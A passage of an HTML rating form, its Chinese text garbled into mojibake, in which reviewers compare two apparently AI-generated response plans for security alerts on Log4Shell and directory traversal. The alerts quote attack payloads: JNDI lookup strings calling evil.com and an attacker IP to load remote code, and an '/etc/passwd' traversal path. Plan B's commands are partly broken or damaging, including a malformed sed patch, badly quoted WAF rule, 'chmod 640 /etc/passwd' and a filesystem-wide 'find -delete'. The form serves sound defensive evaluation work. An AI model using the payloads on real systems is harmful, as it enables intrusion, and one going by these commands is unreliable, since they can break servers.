ã€è¯·æ±‚URIã€‘/api/login
ã€Payloadã€‘${jndi:ldap://45.33.32.156:1389/Exploit}
ã€User-Agentã€‘${jndi:ldap://evil.com/a}
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°Log4j JNDIæ³¨å…¥æ”»å‡»ï¼ˆLog4Shellï¼‰ï¼Œæ”»å‡»è€…åœ¨User-Agentå’Œè¯·æ±‚å‚æ•°ä¸­æ³¨å…¥JNDI Lookupè¡¨è¾¾å¼ï¼Œå°è¯•ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½æ¶æ„ç±»æ‰§è¡Œä»»æ„ä»£ç ã€‚
ã€å¤„ç½®å»ºè®®ã€‘ç«‹å³å‡çº§Log4jåˆ°2.17.0+ï¼Œä¸´æ—¶ç¼“è§£å¯è®¾ç½®log4j2.formatMsgNoLookups=true</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>## äº‹ä»¶æè¿°
2025å¹´12æœˆ4æ—¥12æ—¶ï¼Œæ£€æµ‹åˆ°é’ˆå¯¹å†…ç½‘æœåŠ¡å™¨ï¼ˆ10.0.0.50:8080ï¼‰çš„Log4jè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ”»å‡»ã€‚æ”»å‡»æºIPä¸º45.33.32.156ï¼Œæ”»å‡»è€…åœ¨/api/loginæ¥å£çš„è¯·æ±‚å¤´ï¼ˆUser-Agentï¼‰å’Œå‚æ•°ä¸­æ³¨å…¥JNDI Lookupè¡¨è¾¾å¼ï¼ˆ${jndi:ldap://...}ï¼‰ï¼Œè¯•å›¾åˆ©ç”¨Log4jæ¼æ´CVE-2021-44228ï¼ˆLog4Shellï¼‰ä»æ¶æ„LDAPæœåŠ¡å™¨åŠ è½½å¹¶æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚

## æ”»å‡»åˆ†ç±»
- æ”»å‡»ç±»å‹ï¼šè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰
- æ¼æ´åˆ©ç”¨ï¼šLog4j JNDIæ³¨å…¥ï¼ˆCVE-2021-44228ï¼‰
- ATT&amp;CKæ¡†æ¶ï¼šTA0002ï¼ˆæ‰§è¡Œï¼‰ï¼ŒT1203ï¼ˆåˆ©ç”¨åº”ç”¨ç¨‹åºæ¼æ´ï¼‰

## é£é™©è¯„ä¼°
**é£é™©ç­‰çº§ï¼šé«˜**
- ç†ç”±ï¼šLog4jæ¼æ´ï¼ˆLog4Shellï¼‰ä¸ºé«˜å±RCEæ¼æ´ï¼Œå·²è¢«å¹¿æ³›åˆ©ç”¨ã€‚æ”»å‡»ä¸€æ—¦æˆåŠŸï¼Œæ”»å‡»è€…å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ§åˆ¶æœåŠ¡å™¨ã€‚

## å¤„ç½®å»ºè®®

### 1. å³æ—¶ç¼“è§£æªæ–½
- ç«‹å³æ£€æŸ¥10.0.0.50æœåŠ¡å™¨Log4jç‰ˆæœ¬ï¼Œè‹¥ä¸º2.0-2.14.1ï¼Œç«‹å³é‡‡å–éš”ç¦»æªæ–½
- è®¾ç½®JVMå‚æ•°ï¼š-Dlog4j2.formatMsgNoLookups=true
- ä¸´æ—¶å°ç¦å¯ç–‘æ”»å‡»æºIPï¼ˆ45.33.32.156ï¼‰

### 2. æ ¹å› ä¿®å¤æ–¹æ¡ˆ
- ç«‹å³å°†å—å½±å“æœåŠ¡çš„Log4jå‡çº§åˆ°2.17.0åŠä»¥ä¸Šç‰ˆæœ¬
- æ£€æŸ¥æ‰€æœ‰ä¸šåŠ¡ç³»ç»ŸåŠä¾èµ–ï¼Œæ’æŸ¥æ˜¯å¦å­˜åœ¨Log4jç»„ä»¶

### 3. é¢„é˜²åŠ å›ºæªæ–½
- å¯¹å¤–éƒ¨æ¥å£åŠ å¼ºè¾“å…¥è¿‡æ»¤å’ŒWAFé˜²æŠ¤
- åŠ å¼ºå¯¹æ•æ„ŸæœåŠ¡å™¨çš„ç›‘æ§ä¸å‘Šè­¦</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>ã€å‘Šè­¦åˆ†ç±»ã€‘å‘½ä»¤æ‰§è¡Œ/RCE
ã€é£é™©ç­‰çº§ã€‘ğŸŸ¡ MEDIUMï¼ˆè¯„åˆ†ï¼š0.70ï¼‰
ã€å¤„ç½®å†³ç­–ã€‘ğŸ“‹ å·²åˆ›å»ºå·¥å•ï¼Œç­‰å¾…äººå·¥å®¡æ ¸

ã€äº‹ä»¶æè¿°ã€‘
åœ¨2025å¹´12æœˆ4æ—¥ä¸­åˆ12ç‚¹ï¼Œä¸€èµ·ä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»äº‹ä»¶å‘ç”Ÿã€‚æ”»å‡»è€…ä½¿ç”¨IPåœ°å€45.33.32.156ï¼Œé’ˆå¯¹ç›®æ ‡IP 10.0.0.50çš„8080ç«¯å£å‘èµ·æ”»å‡»ã€‚æ”»å‡»è€…åˆ©ç”¨äº†CVE-2021-44228æ¼æ´ï¼ˆLog4Shellï¼‰ï¼Œé€šè¿‡åœ¨è¯·æ±‚çš„User-Agentå’Œå‚æ•°ä¸­æ³¨å…¥JNDI Lookupè¡¨è¾¾å¼ï¼Œè¯•å›¾ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½æ¶æ„ç±»ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

ã€é£æ§è¯„ä¼°ã€‘
R=0.70(medium): åŠ¨ä½œ0.80+èŒƒå›´1.00+ä¸šåŠ¡0.26 -&gt; ticket
æœ¬æ¬¡å‘Šè­¦è¢«åˆ¤å®šä¸ºä¸­ç­‰é£é™©ï¼ˆç»¼åˆé£é™©è¯„åˆ†ï¼š0.70ï¼‰ã€‚å·²åˆ›å»ºå·¥å•ï¼Œéœ€è¦å®‰å…¨åˆ†æå¸ˆäººå·¥å®¡æ ¸åå†³å®šå¤„ç½®æ–¹æ¡ˆã€‚

ã€å¤„ç½®Playbookã€‘ç½®ä¿¡åº¦: 0.98

â–  å³æ—¶ç¼“è§£æªæ–½
1. å°ç¦æ”»å‡»æºIP [priority: critical]
   æè¿°: åœ¨é˜²ç«å¢™é˜»æ–­æ”»å‡»æºIP 45.33.32.156 çš„æ‰€æœ‰å…¥ç«™æµé‡ï¼Œé˜²æ­¢è¿›ä¸€æ­¥æ”»å‡»
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -I INPUT -s 45.33.32.156 -j DROP
   æ‰§è¡Œå‘½ä»¤(Windows): netsh advfirewall firewall add rule name="Block_45.33.32.156" dir=in action=block remoteip=45.33.32.156
   å›é€€å‘½ä»¤(Linux): iptables -D INPUT -s 45.33.32.156 -j DROP
   å›é€€å‘½ä»¤(Windows): netsh advfirewall firewall delete rule name="Block_45.33.32.156"
   Pre-check: ç¡®è®¤45.33.32.156ä¸æ˜¯ä¼ä¸šå†…éƒ¨æˆ–åˆä½œä¼™ä¼´çš„åˆæ³•ä¸šåŠ¡IP

2. ä¸´æ—¶ç¦ç”¨JNDI LookupåŠŸèƒ½ [priority: critical]
   æè¿°: ä¸ºå—å½±å“çš„JavaæœåŠ¡è®¾ç½®log4j2.formatMsgNoLookups=trueï¼Œä¸´æ—¶å…³é—­å±é™©JNDIåŠŸèƒ½
   æ‰§è¡Œå‘½ä»¤(Linux): export LOG4J_FORMAT_MSG_NO_LOOKUPS=true &amp;&amp; systemctl restart tomcat
   æ‰§è¡Œå‘½ä»¤(Windows): setx LOG4J_FORMAT_MSG_NO_LOOKUPS true &amp;&amp; net stop tomcat &amp;&amp; net start tomcat
   å›é€€å‘½ä»¤(Linux): unset LOG4J_FORMAT_MSG_NO_LOOKUPS &amp;&amp; systemctl restart tomcat
   å›é€€å‘½ä»¤(Windows): setx LOG4J_FORMAT_MSG_NO_LOOKUPS "" &amp;&amp; net stop tomcat &amp;&amp; net start tomcat
   Pre-check: ç¡®è®¤å—å½±å“æœåŠ¡ä½¿ç”¨Log4j 2.xä¸”æœªå‡çº§åˆ°2.17.0åŠä»¥ä¸Šï¼›é‡å¯æœåŠ¡å‰å·²é€šçŸ¥ä¸šåŠ¡æ–¹

â–  æ ¹å› ä¿®å¤æ–¹æ¡ˆ
1. å‡çº§Log4jè‡³2.17.0æˆ–æ›´é«˜ç‰ˆæœ¬ [priority: critical]
   æè¿°: å°†æ‰€æœ‰å—å½±å“ç³»ç»Ÿä¸­çš„Log4jç»„ä»¶å‡çº§åˆ°2.17.0æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œå½»åº•ä¿®å¤CVE-2021-44228
   æ‰§è¡Œå‘½ä»¤(Linux): find / -name "log4j-core-*.jar" -exec cp {} {}.bak \; &amp;&amp; wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.17.0/log4j-core-2.17.0.jar -O /path/to/your/app/lib/log4j-core-2.17.0.jar &amp;&amp; systemctl restart tomcat
   å›é€€å‘½ä»¤(Linux): find / -name "log4j-core-2.17.0.jar" -delete &amp;&amp; find / -name "log4j-core-*.jar.bak" -exec mv {} $(echo {} | sed 's/\.bak$//') \; &amp;&amp; systemctl restart tomcat
   Pre-check: åœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯å‡çº§å…¼å®¹æ€§ï¼Œå¤‡ä»½åŸæœ‰jaræ–‡ä»¶ï¼Œç¡®è®¤ä¸šåŠ¡ä½å³°æœŸæ“ä½œ

â–  é¢„é˜²åŠ å›ºæªæ–½
1. åŠ å›ºé˜²ç«å¢™è§„åˆ™é™åˆ¶8080ç«¯å£è®¿é—® [priority: high]
   æè¿°: ä»…å…è®¸å¯ä¿¡IPè®¿é—®8080ç«¯å£ï¼Œé˜»æ­¢å¤–éƒ¨æœªæˆæƒè®¿é—®
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -A INPUT -p tcp --dport 8080 -s 10.0.0.0/8 -j ACCEPT &amp;&amp; iptables -A INPUT -p tcp --dport 8080 -j DROP
   å›é€€å‘½ä»¤(Linux): iptables -D INPUT -p tcp --dport 8080 -j DROP
   Pre-check: ç¡®è®¤10.0.0.0/8è¦†ç›–æ‰€æœ‰åˆæ³•ä¸šåŠ¡å’Œç®¡ç†ç»ˆç«¯

2. å®šæœŸæ‰«æå¹¶ç§»é™¤é«˜å±ä¾èµ– [priority: medium]
   æè¿°: ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·å®šæœŸæ‰«æå¹¶æŠ¥å‘Šå­˜åœ¨é«˜å±æ¼æ´çš„ä¾èµ–åº“ï¼ŒåŠæ—¶æ¸…ç†æˆ–æ›¿æ¢
   æ‰§è¡Œå‘½ä»¤(Linux): cd /path/to/your/app &amp;&amp; ./dependency-check.sh --scan . --format ALL
   Pre-check: ç¡®è®¤ä¾èµ–æ£€æŸ¥å·¥å…·å·²å®‰è£…å¹¶é…ç½®å¥½è¾“å‡ºè·¯å¾„</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(2)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(2)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-3">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #3: Case07_ç›®å½•éå†</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘ç›®å½•éå†æ”»å‡»æ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 13:00:00
ã€æ”»å‡»æºIPã€‘185.220.101.50
ã€ç›®æ ‡IPã€‘192.168.2.100
ã€ç›®æ ‡ç«¯å£ã€‘80
ã€å¨èƒç­‰çº§ã€‘é«˜å±
ã€æ”»å‡»ç±»å‹ã€‘ç›®å½•éå†
ã€ATT&amp;CKã€‘å‡­è¯è®¿é—®:TA0006|ä¸å®‰å…¨çš„å‡­è¯:T1552
ã€è¯·æ±‚URIã€‘/download?file=../../../etc/passwd
ã€Payloadã€‘../../../etc/passwd
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°ç›®å½•éå†æ”»å‡»ï¼Œæ”»å‡»è€…å°è¯•é€šè¿‡è·¯å¾„ç©¿è¶Šè¯»å–Linuxç³»ç»Ÿçš„/etc/passwdæ–‡ä»¶ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚
ã€å¤„ç½®å»ºè®®ã€‘å¯¹æ–‡ä»¶è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–å¤„ç†ï¼Œé™åˆ¶æ–‡ä»¶è®¿é—®èŒƒå›´ï¼Œä½¿ç”¨ç™½åå•æœºåˆ¶</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>## äº‹ä»¶æè¿°
åœ¨2025å¹´12æœˆ4æ—¥13:00ï¼Œæ£€æµ‹åˆ°æ¥è‡ªIPåœ°å€185.220.101.50çš„æ”»å‡»æµé‡ï¼Œæ”»å‡»ç›®æ ‡ä¸º192.168.2.100çš„80ç«¯å£ï¼ˆHTTPæœåŠ¡ï¼‰ã€‚æ”»å‡»è€…é€šè¿‡Webæ¥å£ï¼ˆå¦‚/download?file=...ï¼‰å°è¯•åˆ©ç”¨"ç›®å½•éå†"æ¼æ´ï¼Œè¯•å›¾è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶/etc/passwdã€‚

## æ”»å‡»åˆ†ç±»
æ­¤äº‹ä»¶å±äº**Webåº”ç”¨æ”»å‡»-ç›®å½•éå†ï¼ˆPath Traversalï¼‰**ã€‚æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚../../../etc/passwdï¼‰ï¼Œç»•è¿‡ç›®å½•é™åˆ¶ï¼Œè®¿é—®æœåŠ¡å™¨ä¸Šæœ¬ä¸åº”å¼€æ”¾çš„æ–‡ä»¶ã€‚

## é£é™©è¯„ä¼°
**é£é™©ç­‰çº§ï¼šé«˜**
- åŸå› ï¼šæ”»å‡»ç›®æ ‡ä¸ºå¸¸è§çš„æ•æ„Ÿæ–‡ä»¶/etc/passwdï¼Œä¸€æ—¦æ³„éœ²å¯å¯¼è‡´ç”¨æˆ·ä¿¡æ¯å¤–æ³„ï¼Œä¸ºæ”»å‡»è€…åç»­æ¸—é€ã€ææƒç­‰æ“ä½œæä¾›æ¡ä»¶ã€‚

## å¤„ç½®å»ºè®®

### 1. å³æ—¶ç¼“è§£æªæ–½
- ç«‹å³å°ç¦æ”»å‡»æºIPï¼ˆ185.220.101.50ï¼‰åœ¨é˜²ç«å¢™æˆ–WAFä¸Š
- ä¸´æ—¶å…³é—­æˆ–é™åˆ¶/downloadç­‰ç›¸å…³æ¥å£æƒé™

### 2. æ ¹å› ä¿®å¤æ–¹æ¡ˆ
- å¯¹æ‰€æœ‰æ–‡ä»¶è®¿é—®æ¥å£è¿›è¡Œä¸¥æ ¼è¾“å…¥æ ¡éªŒå’Œè·¯å¾„è§„èŒƒåŒ–å¤„ç†
- æ˜ç¡®é™å®šå¯è®¿é—®çš„æ–‡ä»¶ç›®å½•ï¼Œä»…å…è®¸è¯»å–ç™½åå•å†…çš„æ–‡ä»¶
- ä½¿ç”¨å®‰å…¨çš„æ–‡ä»¶è®¿é—®å‡½æ•°ï¼ˆå¦‚realpathã€basenameç­‰ï¼‰è¿‡æ»¤è·¯å¾„

### 3. é¢„é˜²åŠ å›ºæªæ–½
- éƒ¨ç½²Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰ï¼Œå¼€å¯ç›®å½•éå†æ£€æµ‹è§„åˆ™
- å®šæœŸå¯¹Webåº”ç”¨è¿›è¡Œå®‰å…¨ä»£ç å®¡è®¡å’Œæ¼æ´æ‰«æ</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>ã€å‘Šè­¦åˆ†ç±»ã€‘ç›®å½•éå†
ã€é£é™©ç­‰çº§ã€‘ğŸŸ¡ MEDIUMï¼ˆè¯„åˆ†ï¼š0.64ï¼‰
ã€å¤„ç½®å†³ç­–ã€‘ğŸ“‹ å·²åˆ›å»ºå·¥å•ï¼Œç­‰å¾…äººå·¥å®¡æ ¸

ã€äº‹ä»¶æè¿°ã€‘
åœ¨2025å¹´12æœˆ4æ—¥ä¸‹åˆ1ç‚¹ï¼Œæ¥è‡ªIPåœ°å€185.220.101.50çš„æ”»å‡»è€…å¯¹IPä¸º192.168.2.100çš„æœåŠ¡å™¨å‘èµ·äº†ä¸€æ¬¡é«˜å±çš„ç›®å½•éå†æ”»å‡»ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„è¯·æ±‚URI '/download?file=../../../etc/passwd'ï¼Œè¯•å›¾åˆ©ç”¨è·¯å¾„ç©¿è¶Šæ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶/etc/passwdã€‚

ã€é£æ§è¯„ä¼°ã€‘
R=0.64(medium): åŠ¨ä½œ0.80+èŒƒå›´0.80+ä¸šåŠ¡0.28 -&gt; ticket
æœ¬æ¬¡å‘Šè­¦è¢«åˆ¤å®šä¸ºä¸­ç­‰é£é™©ï¼ˆç»¼åˆé£é™©è¯„åˆ†ï¼š0.64ï¼‰ã€‚å·²åˆ›å»ºå·¥å•ï¼Œéœ€è¦å®‰å…¨åˆ†æå¸ˆäººå·¥å®¡æ ¸åå†³å®šå¤„ç½®æ–¹æ¡ˆã€‚

ã€å¤„ç½®Playbookã€‘ç½®ä¿¡åº¦: 0.95

â–  å³æ—¶ç¼“è§£æªæ–½
1. å°ç¦æ”»å‡»æºIP [priority: critical]
   æè¿°: åœ¨é˜²ç«å¢™é˜»æ–­æ¶æ„æºIP 185.220.101.50 çš„æ‰€æœ‰å…¥ç«™æµé‡ï¼Œé˜²æ­¢è¿›ä¸€æ­¥æ”»å‡»
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -I INPUT -s 185.220.101.50 -j DROP
   æ‰§è¡Œå‘½ä»¤(Windows): netsh advfirewall firewall add rule name="Block_185.220.101.50" dir=in action=block remoteip=185.220.101.50
   å›é€€å‘½ä»¤(Linux): iptables -D INPUT -s 185.220.101.50 -j DROP
   å›é€€å‘½ä»¤(Windows): netsh advfirewall firewall delete rule name="Block_185.220.101.50"
   Pre-check: ç¡®è®¤ 185.220.101.50 ä¸æ˜¯å†…éƒ¨æˆ–ä¸šåŠ¡ç›¸å…³çš„IPï¼Œé¿å…è¯¯å°ä¸šåŠ¡æµé‡

2. éš”ç¦»å—å½±å“Webä¸»æœº [priority: high]
   æè¿°: ä¸´æ—¶æ–­å¼€ 192.168.2.100 çš„å¤–éƒ¨ç½‘ç»œè¿æ¥ï¼Œé˜²æ­¢æ•°æ®è¿›ä¸€æ­¥æ³„éœ²
   æ‰§è¡Œå‘½ä»¤(Linux): ip link set eth0 down
   æ‰§è¡Œå‘½ä»¤(Windows): netsh interface set interface "ä»¥å¤ªç½‘" admin=disable
   å›é€€å‘½ä»¤(Linux): ip link set eth0 up
   å›é€€å‘½ä»¤(Windows): netsh interface set interface "ä»¥å¤ªç½‘" admin=enable
   Pre-check: ç¡®è®¤éš”ç¦»æ“ä½œä¸ä¼šå½±å“å…³é”®ä¸šåŠ¡ç³»ç»Ÿæˆ–æœåŠ¡ï¼Œå»ºè®®åœ¨è¿ç»´çª—å£æ‰§è¡Œ

â–  æ ¹å› ä¿®å¤æ–¹æ¡ˆ
1. ä¿®å¤Webåº”ç”¨è·¯å¾„ç©¿è¶Šæ¼æ´ [priority: critical]
   æè¿°: ä¿®æ­£Webåº”ç”¨çš„æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Œå¯¹è¾“å…¥å‚æ•°è¿›è¡Œè·¯å¾„è§„èŒƒåŒ–å’Œç™½åå•æ ¡éªŒï¼Œé˜²æ­¢ç›®å½•ç©¿è¶Š
   æ‰§è¡Œå‘½ä»¤(Linux): sed -i.bak '/download/ s/\(file=\)\([^&amp;]*\)/\1$(basename \2)/' /path/to/webapp/download_handler.php
   å›é€€å‘½ä»¤(Linux): mv /path/to/webapp/download_handler.php.bak /path/to/webapp/download_handler.php
   Pre-check: ç¡®è®¤ä»£ç ä¿®æ”¹ä½ç½®ä¸å®é™…WebæœåŠ¡æ–‡ä»¶è·¯å¾„ä¸€è‡´ï¼Œå¹¶åœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯ä¿®å¤æ•ˆæœ

2. é™åˆ¶WebæœåŠ¡è¿›ç¨‹æ–‡ä»¶è®¿é—®æƒé™ [priority: high]
   æè¿°: é€šè¿‡æ“ä½œç³»ç»Ÿæƒé™é…ç½®ï¼Œé™åˆ¶WebæœåŠ¡è´¦æˆ·å¯¹æ•æ„Ÿç›®å½•ï¼ˆå¦‚/etcï¼‰çš„è®¿é—®
   æ‰§è¡Œå‘½ä»¤(Linux): chown root:root /etc/passwd &amp;&amp; chmod 640 /etc/passwd &amp;&amp; usermod -s /usr/sbin/nologin www-data
   å›é€€å‘½ä»¤(Linux): chmod 644 /etc/passwd &amp;&amp; usermod -s /bin/bash www-data
   Pre-check: ç¡®è®¤WebæœåŠ¡è´¦æˆ·ï¼ˆå¦‚www-dataï¼‰ä¸éœ€è¦è®¿é—®ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶

â–  é¢„é˜²åŠ å›ºæªæ–½
1. éƒ¨ç½²Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰è§„åˆ™ [priority: high]
   æè¿°: åœ¨WAFä¸­æ·»åŠ é’ˆå¯¹ç›®å½•éå†æ”»å‡»çš„æ£€æµ‹å’Œæ‹¦æˆªè§„åˆ™
   æ‰§è¡Œå‘½ä»¤(Linux): echo 'SecRule REQUEST_URI "\.\.\/" "id:1001,deny,log,msg:'Path Traversal detected'"' &gt;&gt; /etc/modsecurity/modsecurity.conf &amp;&amp; systemctl reload apache2
   å›é€€å‘½ä»¤(Linux): sed -i '/id:1001,deny,log,msg/d' /etc/modsecurity/modsecurity.conf &amp;&amp; systemctl reload apache2
   Pre-check: ç¡®è®¤WAFå·²éƒ¨ç½²ä¸”é…ç½®æ–‡ä»¶è·¯å¾„æ­£ç¡®ï¼Œè§„åˆ™ä¸ä¼šè¯¯æ‹¦åˆæ³•ä¸šåŠ¡æµé‡

2. å»ºç«‹æ–‡ä»¶è®¿é—®ç™½åå•æœºåˆ¶ [priority: medium]
   æè¿°: ä»…å…è®¸Webåº”ç”¨è®¿é—®é¢„å®šä¹‰çš„æ–‡ä»¶ç›®å½•ï¼Œç¦æ­¢è®¿é—®ä»»æ„è·¯å¾„
   æ‰§è¡Œå‘½ä»¤(Linux): echo '/var/www/html/files/' &gt; /etc/webapp/allowed_dirs.conf &amp;&amp; systemctl reload webapp
   å›é€€å‘½ä»¤(Linux): rm /etc/webapp/allowed_dirs.conf &amp;&amp; systemctl reload webapp
   Pre-check: ç¡®è®¤ä¸šåŠ¡æ‰€éœ€çš„æ–‡ä»¶ç›®å½•å…¨éƒ¨çº³å…¥ç™½åå•

3. åŠ å¼ºæ—¥å¿—ç›‘æ§ä¸å‘Šè­¦ [priority: medium]
